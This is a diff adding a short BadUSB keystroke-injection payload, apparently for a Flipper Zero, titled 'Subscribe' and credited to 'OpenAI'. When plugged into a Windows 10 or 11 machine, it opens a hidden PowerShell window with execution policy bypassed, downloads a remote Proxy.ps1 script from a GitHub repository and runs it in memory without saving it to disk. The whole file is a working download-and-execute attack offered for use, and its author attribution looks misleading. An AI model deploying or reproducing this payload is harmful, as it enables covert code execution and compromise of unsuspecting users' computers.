@@ -1,0 +1,12 @@
+REM     Title: Subscribe
+
+REM     Author: OpenAI
+
+REM     Description: This payload is meant to download and run a script from a URL without saving it to the file system
+
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass -Command "& { IEX (Invoke-WebRequest https://raw.githubusercontent.com/itsweekly/FlipperZero-Bad-Polar/main/Proxy/Proxy.ps1).Content }"
+ENTER
